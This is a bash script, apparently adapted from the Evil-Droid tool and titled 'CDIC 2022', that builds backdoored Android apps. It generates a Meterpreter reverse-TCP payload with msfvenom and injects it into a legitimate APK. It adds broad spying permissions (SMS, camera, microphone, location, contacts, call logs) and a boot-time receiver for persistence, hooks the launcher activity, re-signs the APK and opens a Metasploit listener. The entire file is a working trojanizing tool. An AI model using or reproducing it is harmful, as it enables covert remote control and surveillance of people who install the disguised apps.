#!/usr/bin/env bash

# Reference : Evil-droid
# - https://github.com/M4sc3r4n0/Evil-Droid

# Colors
green='\e[1;32m'
lgreen='\e[0;32m'
blue='\e[1;34m'
lblue='\e[0;34m'
white='\e[1;37m'
lwhite='\e[0;37m'
yellow='\e[1;33m'
red='\e[1;31m'

# Define variables
path=`pwd`
localip=`hostname -I | cut -d " " -f 1`
APKTOOL="$path/tools/apktool.jar"
perms='   <uses-permission android:name="android.permission.INTERNET"/>\n    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>\n    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>\n    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>\n    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>\n    <uses-permission android:name="android.permission.SEND_SMS"/>\n    <uses-permission android:name="android.permission.RECEIVE_SMS"/>\n    <uses-permission android:name="android.permission.RECORD_AUDIO"/>\n    <uses-permission android:name="android.permission.CALL_PHONE"/>\n    <uses-permission android:name="android.permission.READ_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>\n    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>\n    <uses-permission android:name="android.permission.CAMERA"/>\n    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>\n    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>\n    <uses-permission android:name="android.permission.SET_WALLPAPER"/>\n    <uses-permission android:name="android.permission.READ_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>\n    <uses-permission android:name="android.permission.WAKE_LOCK"/>\n    <uses-permission android:name="android.permission.READ_SMS"/>'

# Banner
function banner()
{
echo -e $lblue "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo ""
echo -e $blue "        .dddd8b.  dddddd8b. 8ddddd8 .dddd8b.        .dddd8b.   .dddd8b.   .dddd8b.   .dddd8b.      "
echo -e $blue "       dddP  Yddb ddd   Yddb  ddd  d88P  Y88b      d88P  Yddb dddP  Yddb dddP  Yddb dddP  Yddb     "
echo -e $blue "       ddd    ddd ddd    ddd  ddd  ddd    ddd             ddd ddd    ddd        ddd        ddd     "
echo -e $blue "       ddd        ddd    ddd  ddd  ddd                  .d88P ddd    ddd      .dddP      .dddP     "
echo -e $blue "       ddd        ddd    ddd  ddd  ddd              .oddddP   ddd    ddd  .oddddP    .oddddP       "
echo -e $blue "       ddd    ddd ddd    ddd  ddd  ddd    ddd      dddP       ddd    ddd dddP       dddP           "
echo -e $blue "       Yddb  dddP ddd  .dddP  ddd  Yddb  dddP      ddd        Yddb  dddP ddd        ddd            "
echo -e $blue "         YddddP   dddddddP  8ddddd8  Yddd8P        ddddddddd    Yddd8P   ddddddddd  ddddddddd      "
echo ""
echo -e $lwhite "            < Generate & Embed & Create Backdoor APK for Android Application >                    "
echo ""
echo -e $lblue "++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++"
echo ""
}

# Check dependencies
echo -e $yellow "" 
echo "Checking dependencies configuration" 
echo
# Check Metasploit-Framework
which msfconsole > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "Metasploit-Framework.....................[ ✔ ]"
sleep 1
else
echo -e $red "Metasploit-Framework....................[ X ]"
echo -e $yellow "[+] Installing Metasploit-Framework"
echo -e $lgreen ""
sudo apt-get install metasploit-framework -y
echo -e $blue "[✔] Done installing"
sleep 1
clear
fi
# Check Xterm
which xterm > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "Xterm....................................[ ✔ ]"
sleep 1
else
echo ""
echo -e $red "Xterm...................................[ X ]"
echo -e $yellow "[+] Installing Xterm "
echo -e $lgreen ""
sudo apt-get install xterm -y
echo -e $blue "[✔] Done installing"
sleep 1
clear
fi
# Check Zenity
which zenity > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "Zenity...................................[ ✔ ]"
sleep 1
else
echo ""
echo -e $red "Zenity..................................[ X ]"
echo -e $yellow "[+] Installing Zenity "
echo -e $lgreen ""
sudo apt-get install zenity -y
echo -e $blue "[✔] Done installing"
sleep 1
clear
fi
# Check Apktool Reverse Engineering
which apktool > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "Apktool..................................[ ✔ ]"
sleep 1
else
echo ""
echo -e $red "Apktool.................................[ X ]"
echo -e $yellow "[+] Installing Apktool "
echo -e $lgreen ""
sudo apt-get install apktool -y
echo -e $blue "[✔] Done installing"
sleep 1
clear
fi
# Check Zipalign
which zipalign > /dev/null 2>&1
if [ "$?" -eq "0" ]; then
echo -e $green "Zipalign.................................[ ✔ ]"
sleep 1
zenity --title " DEPENDENCIES " --info --text "All dependencies installed" --width 300 > /dev/null 2>&1
sleep 1
clear
else
echo ""
echo -e $red "Zipalign................................[ X ]"
echo -e $yellow "[+] Installing Zipalign"
echo -e $lgreen ""
sudo apt-get install zipalign -y
echo -e $blue "[✔] Done installing"
sleep 1
zenity --title " DEPENDENCIES " --info --text "All dependencies installed" --width 300 > /dev/null 2>&1
sleep 1
clear
fi

# function lhost
function get_lhost() 
{  
  LHOST=$(zenity --title=" SET LHOST " --text "Enter Your IP Address" --entry-text "$localip" --entry --width 300 2> /dev/null)
}
# function lport
function get_lport() 
{
  LPORT=$(zenity --title=" SET LPORT " --text "Enter Your Port" --entry --width 300 2> /dev/null)
}
# function name
function payload_name()
{
 apk_name=$(zenity --title " PAYLOAD NAME " --text "Enter Your APK name" --entry --width 300 2> /dev/null)
}
# function original apk
function orig_apk()
{
 orig=$(zenity --title " ORIGINAL APK " --filename=$path --file-selection --file-filter "*.apk" 2> /dev/null) 
}
# function generate payload
function gen_payload()
{
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk > /dev/null 2>&1
}
# function apktool
function apk_decomp()
{
 java -jar $APKTOOL d -f -o $path/payload $path/$apk_name.apk > /dev/null 2>&1
 rm $apk_name.apk
}
function apk_decomp_orig()
{
 java -jar $APKTOOL d -f -o $path/original $orig > /dev/null 2>&1
}
function apk_comp()
{
 java -jar $APKTOOL b $path/original -o tmp_backdoor.apk > /dev/null 2>&1
 rm -r payload > /dev/null 2>&1
 rm -r original > /dev/null 2>&1
}
# Perms text format
function Permission_text()
{
echo -e $white "<uses-permission android:name=""android.permission.INTERNET""/>"
echo -e $white "<uses-permission android:name=""android.permission.ACCESS_NETWORK_STATE""/>"
echo -e $white "<uses-permission android:name=""android.permission.ACCESS_WIFI_STATE""/>"
echo -e $white "<uses-permission android:name=""android.permission.ACCESS_COARSE_LOCATION""/>"
echo -e $white "<uses-permission android:name=""android.permission.ACCESS_FINE_LOCATION""/>"
echo -e $white "<uses-permission android:name=""android.permission.READ_PHONE_STATE""/>"
echo -e $white "<uses-permission android:name=""android.permission.SEND_SMS""/>"
echo -e $white "<uses-permission android:name=""android.permission.RECEIVE_SMS""/>"
echo -e $white "<uses-permission android:name=""android.permission.RECORD_AUDIO""/>"
echo -e $white "<uses-permission android:name=""android.permission.CALL_PHONE""/>"
echo -e $white "<uses-permission android:name=""android.permission.READ_CONTACTS""/>"
echo -e $white "<uses-permission android:name=""android.permission.WRITE_CONTACTS""/>"
echo -e $white "<uses-permission android:name=""android.permission.WRITE_SETTINGS""/>"
echo -e $white "<uses-permission android:name=""android.permission.CAMERA""/>"
echo -e $white "<uses-permission android:name=""android.permission.WRITE_EXTERNAL_STORAGE""/>"
echo -e $white "<uses-permission android:name=""android.permission.RECEIVE_BOOT_COMPLETED""/>"
echo -e $white "<uses-permission android:name=""android.permission.SET_WALLPAPER""/>"
echo -e $white "<uses-permission android:name=""android.permission.READ_CALL_LOG""/>"
echo -e $white "<uses-permission android:name=""android.permission.WRITE_CALL_LOG""/>"
echo -e $white "<uses-permission android:name=""android.permission.WAKE_LOCK""/>"
echo -e $white "<uses-permission android:name=""android.permission.READ_SMS""/>"
}
# function adding permission
function perms()
{
 package_name=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'` 2>&1
 package_dash=`head -n 2 $path/original/AndroidManifest.xml|grep "<manifest"|grep -o -P 'package="[^\"]+"'|sed 's/\"//g'|sed 's/package=//g'|sed 's/\./\//g'|sed 's|/|.|g'` 2>&1
 tmp=$package_name
 sed -i "5i\ $perms" $path/original/AndroidManifest.xml
 rm $path/payload/smali/com/metasploit/stage/MainActivity.smali 2>&1
 sed -i "s|Lcom/metasploit|L$package_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
 cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$package_name 2>&1
 rc=$?
 if [ $rc != 0 ];then
  app_name=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's%/[^/]*$%%'` 2>&1
  app_dash=`grep "<application" $path/original/AndroidManifest.xml|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'|sed 's|/|.|g'|sed 's%.[^.]*$%%'` 2>&1
  tmp=$app_name
  sed -i "s|L$package_name|L$app_name|g" $path/payload/smali/com/metasploit/stage/*.smali 2>&1
  cp -r $path/payload/smali/com/metasploit/stage $path/original/smali/$app_name > /dev/null 2>&1
  amanifest="    </application>"
  boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$app_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$app_dash.stage.MainService'"/></application>'
  sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 fi
 amanifest="    </application>"
 boot_cmp='        <receiver android:label="MainBroadcastReceiver" android:name="'$package_dash.stage.MainBroadcastReceiver'">\n            <intent-filter>\n                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n            </intent-filter>\n        </receiver><service android:exported="true" android:name="'$package_dash.stage.MainService'"/></application>'
 sed -i "s|$amanifest|$boot_cmp|g" $path/original/AndroidManifest.xml 2>&1    
 android_nam=$tmp
}
# function hook smali
function hook_smalies()
{
 android_nam=$tmp
 launcher_line_num=`grep -n "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml |awk -F ":" 'NR==1{ print $1 }'` 2>&1
 android_name=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<application"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_activity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|tail -1|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 android_targetActivity=`grep -B $launcher_line_num "android.intent.category.LAUNCHER" $path/original/AndroidManifest.xml|grep -B $launcher_line_num "android.intent.action.MAIN"|grep "<activity"|grep -m1 ""|grep -o -P 'android:name="[^\"]+"'|sed 's/\"//g'|sed 's/android:name=//g'|sed 's/\./\//g'` 2>&1
 if [ $android_name ]; then
  hook_num=`grep -n "    return-void" $path/original/smali/$android_name.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  starter="invoke-static {}, L$android_nam/stage/MainService;->start()V"
  echo -e $white "In line: $hook_num"
  echo -e $white "Inject Smali: $android_name.smali" |awk -F ":/" '{ print $NF }'
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_name.smali > /dev/null 2>&1
 elif [ ! -e $android_activity ]; then
  hook_num=`grep -n "    return-void" $path/original/smali/$android_activity.smali 2>&1| cut -d ";" -f 1 |awk -F ":" 'NR==1{ print $1 }'` 2>&1
  starter="invoke-static {}, L$android_nam/stage/MainService;->start()V"
  echo -e $white "In line: $hook_num"
  echo -e $white "Inject Smali: $android_activity.smali" |awk -F ":/" '{ print $NF }'
  sed -i "${hook_num}i\ ${starter}" $path/original/smali/$android_activity.smali > /dev/null 2>&1
 fi
}
# function signing apk
function sign()
{
 if [ ! -f ~/.android/debug.keystore ]; then
     echo -e $lwhite "[+] Debug key not found. Generating one now..."
     if [ ! -d "~/.android" ]; then
       mkdir ~/.android > /dev/null 2>&1
     fi
     echo -e $lgreen ""
     keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 
 fi
 jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA tmp_backdoor.apk androiddebugkey > /dev/null 2>&1
 echo -e $lwhite "jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA tmp_backdoor.apk androiddebugkey"
 echo
 echo -e $blue "[*] Verifying Signed Artifacts..."
 jarsigner -verify -certs tmp_backdoor.apk > /dev/null 2>&1
 echo -e $lwhite "jarsigner -verify -certs tmp_backdoor.apk"
 rc=$?
 if [ $rc != 0 ]; then
   echo
   echo -e $red "[!] Failed to verify signed artifacts"
   exit $rc
 fi
 echo
 echo -e $blue "[*] Aligning Recompiled APK..."
 zipalign 4 tmp_backdoor.apk $apk_name.apk 2>&1
 echo -e $lwhite "zipalign 4 tmp_backdoor.apk $apk_name.apk"
 rc=$?
 if [ $rc != 0 ]; then
   echo
   echo -e $red "[!] Failed to align recompiled APK"
   exit $rc
 fi
 rm tmp_backdoor.apk > /dev/null 2>&1
 echo ""
 echo -e $yellow "[✔] Done"
}

# function listeners
function listener()
{
 start=$(zenity --question --title=" START LISTENER " --text "Do you want to start listening now?" --width 300 2> /dev/null)
 if [ "$?" -eq "0" ]; then
  xterm -T "LISTENER MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
  clear 
  main
 else
  sleep 1
  clear 
  main
 fi
}

# main
function main()
{
    while :
    do

	banner
	echo -e $yellow "OPTIONS : "
	echo -e $blue
        echo " [1] GENERATE PAYLOAD APK                        "
        echo " [2] CREATE NEW PAYLOAD APK                      "
        echo " [3] START LISTENER                              "
        echo " [0] EXIT                                        "
        echo -e $yellow
        read -p " Select > " option
        echo
        
        case "$option" in 
            1)  echo -e $green "[1] GENERATE PAYLOAD APK"
                echo
                get_lhost
                get_lport
                payload_name
                echo -e $blue "[*] Generating Payload APK..."
                echo -e $lwhite "msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk"
                gen_payload | zenity --progress --pulsate --title=" CDIC 2022 " --text="Generating payload apk..." --auto-close --width 400 > /dev/null 2>&1
                sleep 1
                echo
                echo -e $yellow "[✔] Done"
                #error0
                zenity --title " BACKDOORED APK " --info --text "PATH: $path/$apk_name.apk " --width 400 > /dev/null 2>&1
                listener
                echo
                ;;
            2)  echo -e $green "[2] CREATE NEW PAYLOAD APK"
            	echo
                get_lhost
                get_lport
                payload_name
                orig_apk
                echo -e $blue "[*] Generating Payload APK..."
                echo -e $lwhite "msfvenom -p android/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -a dalvik --platform android R -o $apk_name.apk"
                gen_payload | zenity --progress --pulsate --title=" CDIC 2022 " --text="Generating payload apk..." --auto-close --width 400 > /dev/null 2>&1
                sleep 1
                echo 
                echo -e $blue "[*] Decompiling Original APK..."
                echo -e $lwhite "apktool d -f -o $path/original $orig"
                apk_decomp_orig | zenity --progress --pulsate --title=" CDIC 2022 " --text="Decompiling original apk..." --auto-close --width 400 > /dev/null 2>&1
                sleep 1
                echo
                echo -e $blue "[*] Decompiling Payload APK..."
                echo -e $lwhite "apktool d -f -o $path/payload $path/$apk_name.apk"
                apk_decomp | zenity --progress --pulsate --title=" CDIC 2022 " --text="Decompiling payload apk..." --auto-close --width 400 > /dev/null 2>&1
                sleep 1
                echo
                echo -e $blue "[*] Adding Permission to Original AndroidManifest.xml..."
                sleep 1
                Permission_text
                perms
                sleep 1
                echo
                echo -e $blue "[*] Hooking Smalies..."
                hook_smalies
                sleep 1
                echo
                echo -e $blue "[*] Rebuilding Backdoored APK..."
                echo -e $lwhite "apktool b $path/original -o tmp_backdoor.apk"
                apk_comp | zenity --progress --pulsate --title=" CDIC 2022 " --text="Rebuilding backdoored apk..." --auto-close --width 400 > /dev/null 2>&1
                sleep 1
                echo
                echo -e $blue "[*] Signing APK..."
                sign
                sleep 1
                #error
                zenity --title " BACKDOORED APK " --info --text "PATH: $path/$apk_name.apk " --width 400 > /dev/null 2>&1
                listener
                echo
                ;;
            3)  echo -e $green "[3] START LISTENER"
                echo
                get_lhost
                get_lport
                listener 
                echo
                ;;
            0)  echo -e $yellow "[0] Exit"
                echo
                exit 0 
                ;;
            *)  echo -e $red  "[X] Invalid option, please select valid option [X]"
                echo
                sleep 1
                ;;
        esac
    done
}
main
